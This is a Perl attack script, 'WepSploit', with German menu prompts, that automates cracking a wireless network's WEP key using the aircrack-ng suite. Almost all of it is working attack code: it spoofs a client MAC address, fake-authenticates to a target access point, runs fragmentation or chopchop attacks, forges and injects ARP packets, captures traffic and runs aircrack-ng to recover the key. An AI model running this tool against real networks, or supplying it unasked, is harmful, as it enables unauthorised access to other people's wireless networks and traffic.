#!usr/bin/perl
# WepSploit <= 1.0.1
# Discovered by: Neo2k8
# Visit: [url]www.DarK-CodeZ.org[/url] / [url]www.Codeware.de.am[/url]
# Comment: Happy easter!
#
#   ___     ___
#  /   \   /   \       ___________________________
# /   / \_/ \   \     /                           \
# \__/\     /\__/    /  GIVE ME A CARROT OR I WILL \
#      \O O/         \      BLOW UP YOUR HOUSE     /
#   ___/ ^ \___      / ___________________________/
#      \___/        /_/
#      _/ \_
#   __//   \\__
#  /___\/_\/___\
#
########################################################
#
# Only for Linux with Aircrack-ng
#
# Tested on Backtrack 2 Final , Backtrack 3 Beta
#
########################################################
if (@ARGV < 4)
{
print<<EOF;
\n\n
 ________               _______         __         __ __   
|  |  |  |.-----.-----.|     __|.-----.|  |.-----.|__|  |_ 
|  |  |  ||  -__|  _  ||__     ||  _  ||  ||  _  ||  |   _|
|________||_____|   __||_______||   __||__||_____||__|____|
                |__|            |__|     
					coded by Neo2k8
Usage : 
perl WepSploit.pl <channel> <mac from ap> <ssid> <interface>


EOF
exit;
} 

$channel = $ARGV[0];
$apmac= $ARGV[1];
$ssid= $ARGV[2];
$interface = $ARGV[3];
&loop;

sub loop {
system("clear");
print "\n\n","Bitte waehlen Sie","\n";
print "--------------------------","\n";
print "[1] Eigene ClientMAC benutzen","\n";
print "[2] Random ClientMAC benutzen","\n";
chomp($eingabe=<STDIN>);
Case:{
	$eingabe==1 && do {
			system("clear");
			print "\n","Bitte geben Sie die ClientMac ein","\n";
			print "die benutzt werden soll","\n";
			chomp($clientmac=<STDIN>);
			&start;
			last Case;
			  };

	$eingabe==2 && do {
			system("clear");
			print "\n","Benutze Random ClientMAC","\n";
			&macchanger;
			last Case;
			  };
			do {
			 print "\n","Falsche eingabe","\n";
			  &loop; 
			  };
}
}
sub macchanger {
$a = int(rand(90) +10);
$b = int(rand(90) +10);
$c = int(rand(90) +10);
$d = int(rand(90) +10);
$e = int(rand(90) +10);
$f = int(rand(90) +10);
$clientmac = "$a:$b:$c:$d:$e:$f";
&start;
}

sub start {
print "Faked MAC is : $clientmac","\n\n\n";
system("ifconfig $interface down");
system("macchanger -m $clientmac $interface");
system("ifconfig $interface up");
sleep 3;
system("airmon-ng stop $interface");
sleep 1;
system("airmon-ng start $interface $channel");
sleep 3;
&loop2;
}

sub loop2 {
system("clear");
print "\n\n","Bitte waehlen Sie","\n";
print "--------------------------","\n";
print "[1] Normale Authentication","\n";
print "[2] Andere Authentication fuer Picky Access Points","\n";
chomp($eingabe=<STDIN>);
Case:{
	$eingabe==1 && do {
			system("clear");
		   print "\n","+++++++++++++++++++++++++++++++","\n";
			print "++++ Normal Authentication ++++","\n";
			print "+++++++++++++++++++++++++++++++","\n";
			&normal;
			last Case;
			  };

	$eingabe==2 && do {
			system("clear");
		   print "\n","++++++++++++++++++++++++++++++","\n";
			print "++++ Picky Authentication ++++","\n";
			print "++++++++++++++++++++++++++++++","\n";
			&picky;
			last Case;
			  };
			do {
			 print "\n","Falsche eingabe","\n";
			  &loop2; 
			  };
}
}



sub normal {
system("aireplay-ng -1 0 -e $ssid -a $apmac -h $clientmac $interface");
sleep 4;
&loop3;
}

sub picky {
if (defined($pid = fork)) {
if ($pid) {
	&loop3;
} else {
	&execut;
}
}
else {
die "Prozess klonen fehlgeschlagen\n";
}
}

sub execut {
system("konsole --e aireplay-ng -1 6000 -o 1 -q 10 -e $ssid -a $apmac -h $clientmac $interface");
}

sub loop3 {
system("clear");
print "\n\n","Bitte waehlen Sie","\n";
print "--------------------------","\n";
print "[1] Fragmentation Attack","\n";
print "[2] Chopchop Attack","\n";
chomp($attack=<STDIN>);
Case:{
	$attack==1 && do {
			system("clear");
		   print "\n","++++++++++++++++++++++++++++++","\n";
			print "++++ Fragmentation Attack ++++","\n";
			print "++++++++++++++++++++++++++++++","\n";
			&frag;
			last Case;
			  };

	$attack==2 && do {
			system("clear");
		   print "\n","++++++++++++++++++++++++++++++","\n";
			print "++++   Chopchop  Attack   ++++","\n";
			print "++++++++++++++++++++++++++++++","\n";
			&chop;
			last Case;
			  };
			do {
			 print "\n","Falsche eingabe","\n";
			  &loop2; 
			  };
}
}

sub frag {
system("aireplay-ng -5 -b $apmac -h $clientmac $interface");
sleep 3;
&loop4;
}


sub chop {
system("aireplay-ng -4 -b $apmac -h $clientmac $interface");
sleep 3;
&loop4;
}

sub loop4 {
system("packetforge-ng -0 -a $apmac -h $clientmac -k 255.255.255.255 -l 255.255.255.255 -y *.xor -w arp-request");
sleep 3;
&loop5;
}

sub loop5 {
if (defined($pid = fork)) {
if ($pid) {
	&loop6;
} else {
	&dump;
}
}
else {
die "Prozess klonen fehlgeschlagen\n";
}

}

sub dump {
system("konsole --e airodump-ng -c $channel --bssid $apmac -w capture $interface");
}

sub loop6 {
if (defined($pid = fork)) {
if ($pid) {
	&loop7;
} else {
	&inject;
}
}
else {
die "Prozess klonen fehlgeschlagen\n";
}

}


sub inject {
system("konsole --e aireplay-ng -2 -r arp-request $interface");
}

sub loop7 {
sleep 20;
system("aircrack-ng -z -b $apmac capture*.cap");
}